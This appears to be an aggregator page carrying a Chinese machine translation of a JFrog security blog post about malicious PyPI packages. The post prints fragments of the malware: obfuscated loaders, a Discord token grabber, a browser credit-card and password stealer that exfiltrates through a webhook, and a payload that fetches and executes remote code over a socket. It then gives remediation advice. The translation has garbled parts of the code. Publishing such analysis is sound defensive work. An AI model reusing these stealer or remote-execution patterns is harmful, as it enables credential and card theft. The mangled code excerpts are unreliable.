<!doctype html><html lang="zh-hans"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>恶意 PyPI 包窃取信用卡并注入代码</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"><link rel="stylesheet" href="/img/css.css?random="><link data-rh="true" rel="icon" href="/img/favicon.ico"/><script data-ad-client="ca-pub-6067137220025946" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script type="text/javascript" src="https://platform-api.sharethis.com/js/sharethis.js#property=5effb96910009800120b8d4d&product=inline-share-buttons" async="async"></script>
<script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?03c1a0f31299b4a2fbb83c34d6beaac9";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script></head><body><div id="my_header"><div class="container"><nav class="navbar navbar-expand-lg"><a class="navbar-brand" href="/"><img alt="diglog" src="/img/logo.v1.gif" class="rounded-sm"></a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarNavAltMarkup"><div class="navbar-nav"></div></div></nav></div></div><div class="container"><div id="my_content"><h1 class="page_narrow">恶意 PyPI 包窃取信用卡并注入代码</h1><div class="row"><div class="col-lg-12 col-12"><div class="my_story_list_item shadow p-3 mb-5 bg-white rounded"><div class="story_page_pub_time page_narrow">2021-08-05 20:55:10</div><div class="story_img_container"><a href="http://img2.diglog.com/img/2021/8/da72ed83418b9eaef7e64f16d3dcedf0.png"><img src="http://img2.diglog.com/img/2021/8/da72ed83418b9eaef7e64f16d3dcedf0.png" class="img-fluid my_story_img" onerror="this.style.display='none'"></a></div><div class="page_narrow text-break page_content"><p>软件包存储库正在成为供应链攻击的热门目标。最近，有关于恶意软件攻击 npm、PyPI 和 RubyGems 等流行存储库的消息。开发人员盲目地信任存储库并从这些来源安装软件包，假设它们是安全的。有时允许将恶意软件包上传到包存储库，使恶意行为者有机会使用存储库分发病毒并对管道中的开发人员和 CI/CD 机器发起成功的攻击。作为 JFrog 安全研究团队（前身为 Vdoo）自动识别恶意包的持续努力的一部分，我们现在报告托管在 PyPI 上的几个 Python 包是恶意的。我们已通知 PyPI 有关恶意软件包的存在，并立即将其删除。根据 pepy.tech 的数据，我们估计恶意软件包的下载次数约为 30,000 次。我们目前没有关于使用这些恶意软件包造成的实际影响的数据。在这篇博文中，我们将分享这些软件包的技术分析及其影响。上述所有软件包（以及大多数 Python 新手恶意软件）都使用了一种简单的混淆技术：import base64, codecs magic = &#39;aW1wb3J0IGNvbG9yYW1hLCBkYXRldGltZS...&#39; love = &#39;0iL​​KOcY3L4Y2q1nJkxpl97nZYogdm&#39;... yxIKAVDaAQK3xjpQWkqRAboUcBIzqjEmS...&#39;joy = &#39;\x72\x6f\x74\x31\x33&#39; trust = eval(&#39;\x6d\x61\x67\x69\x63&#39;) + eval(&#39;\x63\x6x5\x63&#39; \x73\x2e\x64...&#39;) eval(compile(base64.b64decode(eval(&#39;\x74\x72\x75\x73\x74&#39;)),&#39;&#39;,&#39;exec&#39;)) 这种混淆可以欺骗一个简单的静态分析工具，但并不反对更彻底的分析，实际上提出了一个危险信号，让许多研究人员仔细研究这段代码。混淆代码中使用的特定（受北欧金属启发？）字符串帮助我们意识到恶意软件只是使用公共工具 python-obfuscator 进行了处理。</p><p>使用 PyArmor 对 aryi 和 permit 包进行了混淆，这表明恶意软件开发人员正在尝试不同的混淆方法。贵族“家族”恶意软件的第一个有效载荷是窃取 Discord 身份验证令牌。身份验证令牌允许攻击者冒充最初持有令牌的用户（类似于 HTTP 会话 cookie）。窃取令牌的有效载荷基于臭名昭著的 dTGPG（Discord Token Grabber Payload Generator）有效载荷。这是一个从未公开发布的生成器工具，但有效载荷（个性化令牌抓取器）是公开共享的，并且一些示例也上传到了 Github。 Discord 身份验证令牌窃取器代码非常简单，它迭代一组硬编码的路径： local = os.getenv(&#39;LOCALAPPDATA&#39;) roaming = os.getenv(&#39;APPDATA&#39;) paths = { &#39;Discord&#39;: roaming + &#39;\\ Discord&#39;, &#39;Discord Canary&#39;: 漫游 + &#39;\\discordcanary&#39;, &#39;Discord PTB&#39;: 漫游 + &#39;\\discordptb&#39;, &#39;Google Chrome&#39;: 本地 + &#39;\\Google\\Chrome\\User Data\\Default &#39;, &#39;Opera&#39;: 漫游 + &#39;\\Opera Software\\Opera Stable&#39;, &#39;Brave&#39;: 本地 + &#39;\\BraveSoftware\\Brave-Browser\\User Data\\Default&#39;, &#39;Yandex&#39;: 本地 + &#39; \\Yandex\\YandexBrowser\\User Data\\Default&#39; } 然后简单地读取这些路径下的所有 .log 和 .ldb 文件（特别是在 Local Sotrage\leveldb 下）并查找 Discord 身份验证令牌，如下所示：AhDDanSZFkkf2j2J8co2d5Tn .G2rsTL.ZP2E7xR3AiapA8oNmgyqsao0Fj1（单因素令牌 – 24 个字符 + &#39;.&#39; + 6 个字符 + &#39;.&#39; + 27 个字符）</p><p>结果通过 Webhook（一种将自动消息和数据更新发送到私人服务器上的文本通道的简单方法）上传到 Discord，参数如下：{ &quot;type&quot;: 1, &quot;id&quot;: &quot;807327703082074143&quot;, &quot;name&quot;: &quot;Captain Hook&quot;, &quot;avatar&quot;: null, &quot;channel_id&quot;: &quot;725001140324008047&quot;, &quot;guild_id&quot;: &quot;720931953251057725&quot;, &quot;application_id&quot;: null, &quot;token&quot;: &quot;uwAgm3PQUNDQvCdvChpx7vCvCvFxpgsvCvCvCvCypgsvCypgsvCypz8047&quot;贵族家族的第二个有效载荷是“自动完成”信息窃取器。所有现代浏览器都支持为用户保存密码和信用卡信息：这很方便，但缺点是这些信息可能会被访问​​本地机器的恶意软件泄露。 def cs(): master_key = master() login_db = os.environ[&#39;USERPROFILE&#39;] + os.sep + \r&#39;AppData\Local\Google\Chrome\User Data\default\Web Data&#39;shutil.copy2(login_db, &quot;CCvault.db&quot;) conn = sqlite3.connect(&quot;CCvault.db&quot;) cursor = conn.cursor() try: cursor.execute(&quot;SELECT * FROM credit_cards&quot;) for r in cursor.fetchall(): username = r [1]encrypted_pa​​ssword=r[4]decrypted_pa​​ssword=dpw(encrypted_pa​​ssword,master_key)expire_mon=r[2]expire_year=r[3]hook.send(f&quot;CARD-NAME:&quot;+用户名+&quot;\nNUMBER:&quot;+decrypted_pa​​ssword + &quot;\nEXPIRY M: &quot; + str(expire_mon) + &quot;\nEXPIRY Y: &quot; + str(expire_year) + &quot;\n&quot; + &quot;*&quot; * 10 + &quot;\n&quot;) login_db = os.environ[&#39;USERPROFILE&#39; ] + os.sep + r&#39;\AppData\Local\Microsoft\Edge\User Data\Profile 1\Login Data&#39; ... cursor.execute(&quot;SELECT action_url, username_value, password_value FROM logins&quot;)decrypted_pa​​ssword = dpw(encrypted_pa​​ssword, master_key) 如果用户名 != &quot;&quot; 或 encrypted_pa​​ssword != &quot;&quot;: hook.send(f&quot;URL: &quot; + url + &quot;\nUSER: &quot; + username + &quot;\nPASSWORD: &quot; + encrypted_p assword + &quot;\n&quot; + &quot;*&quot; * 10 + &quot;\n&quot;) 贵族家族的第三个payload收集受害者系统的以下信息，并将其上传到提到的Webhook：</p><p>在“使 pytagora 定理变得容易”（原文如此）的有趣伪装下，这是包的全部代码： import math import base64,sys def hello(): exec(base64.b64decode(&#39;aW1wb3J0IHNvY2tldCxzdHJ1Y3Qs...&#39;)) def hypotenuse (a,b): hello() c = math.sqrt(math.pow(a,2) + math.pow(b,2)) return round(c,2) def other(c,x): y = math.sqrt(math.pow(c,2)-math.pow(x,2)) return round(y,2) import socket,struct,time s=socket.socket(2,socket.socket.socket.SOCK_STREAM ) s.connect((&#39;172.16.60.80&#39;,9009)) l=struct.unpack(&#39;&gt;I&#39;,s.recv(4))[0] 打印 (l) d=s.recv(l) 打印 ( d) while len(d)&gt;!1: d+=s.recv(l-len(d)) print (d) exec(d,{&#39;s&#39;:s}) 简而言之——恶意软件试图连接到TCP 端口 9009 上的私有 IP 地址，然后执行从套接字读取的任何 Python 代码。如果在检查您的 PyPI 依赖项后，您确定已经在本地安装了 noblesse（或其任何克隆），我们建议： 检查 Edge 中保存了哪些密码，并在每个相应的网站（加上任何重复使用这些密码的网站）。可以通过打开 Edge 并导航到 edge://settings/passwords 来执行检查。保存的密码（可能已被泄露）的完整列表可以在“保存的密码”下查看。检查 Chrome 中保存了哪些信用卡并考虑取消这些信用卡。可以通过打开 Chrome 并导航到 chrome://settings/payments 来执行检查。已保存的信用卡（可能已被盗用）的完整列表可在付款方式下查看。</p><p>如果您确定 pytagora（或其任何克隆）已本地安装在您的机器上，而您不太可能感染恶意软件，我们建议您遵循通常的恶意软件检查步骤，例如使用已安装的 Anti 运行完整扫描- 病毒软件。正如我们在之前的 PyPI 研究中也看到的，公共软件存储库中缺乏节制和自动化安全控制，即使是没有经验的攻击者也可以将它们用作传播恶意软件的平台，无论是通过域名抢注、依赖混淆还是简单的社会工程攻击。本研究中分析的几乎所有代码片段都基于已知的公共工具，仅更改了少数参数。混淆也是基于公共混淆器。我们希望看到更多这些“弗兰肯斯坦”恶意软件包从不同的攻击工具拼接而成（具有更改的渗漏参数）。我们将继续监控公共软件包存储库以清理此类实例。最后，我们要感谢 Dustin Ingram (@di_codes) 快速响应并删除恶意软件包。</p></div><div id="story_share_this"><div class="sharethis-inline-share-buttons"></div></div><div class="text-break sotry_link page_narrow"><a target="_blank" href="https://jfrog.com/blog/malicious-pypi-packages-stealing-credit-cards-injecting-code/">https://jfrog.com/blog/malicious-pypi-packages-stealing-credit-cards-injecting-code/</a></div><div class="story_tags page_narrow"><button type="button" class="btn btn-light my_tag"><a href="/tag/代码/">#代码</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/pypi/">#pypi</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/quot/">#quot</a></button></div></div><div class="shadow p-3 mb-5 bg-white rounded clearfix"><div class="container"><div class="row"><div class="col-sm"><div><a target="_blank" href="/story/1071122.html"><img src="http://img2.diglog.com/img/2021/8/thumb_dfb3bac7d60b5f4018018abfec908b9f.png" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1071122.html">留下遗产</a></div><span class="my_story_list_date">2021-8-2 16:39</span></div><div class="col-sm"><div><a target="_blank" href="/story/1071071.html"><img src="http://img2.diglog.com/img/2021/8/thumb_7cf484ceeae6bc7fc2161eddc603cd15.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1071071.html">创意代码管理</a></div><span class="my_story_list_date">2021-8-2 7:0</span></div><div class="col-sm"><div><a target="_blank" href="/story/1070616.html"><img src="http://img2.diglog.com/img/2021/7/thumb_25fcfabace13adb5e0b4f32ba2db185d.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1070616.html">恶意 PyPI 包窃取开发者数据并注入代码</a></div><span class="my_story_list_date">2021-7-30 20:5</span></div><div class="col-sm"><div><a target="_blank" href="/story/1070427.html"><img src="http://img2.diglog.com/img/2021/7/thumb_876e33c32a491d47ef14c7ccae12fb40.png" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1070427.html">70 万行代码、20 年和一名开发人员：矮人要塞是如何构建的</a></div><span class="my_story_list_date">2021-7-30 0:41</span></div></div></div></div><div class="my_movie_list_item shadow p-3 mb-5 bg-white rounded"><button type="button" class="btn btn-link my_tag"><a href="/tag/web2.0/">#web2.0</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/google/">#google</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/设计/">#设计</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/创意/">#创意</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/摄影/">#摄影</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/图片/">#图片</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/游戏/">#游戏</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/软件/">#软件</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/视频/">#视频</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/手机/">#手机</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/广告/">#广告</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/iphone/">#iphone</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/网站/">#网站</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/免费/">#免费</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/下载/">#下载</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/windows/">#windows</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/微软/">#微软</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/苹果/">#苹果</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/blog/">#blog</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/firefox/">#firefox</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/apple/">#apple</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/音乐/">#音乐</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/博客/">#博客</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/wordpress/">#wordpress</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/恶搞/">#恶搞</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/qq/">#qq</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/艺术/">#艺术</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/web/">#web</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/工具/">#工具</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/谷歌/">#谷歌</a></button></div></div></div><div id="my_footer"><div class=""><a href="/tags/">tags</a> <a href="/users/">users</a></div>&copy;2012-2021 diglog.com </div></div></body></html>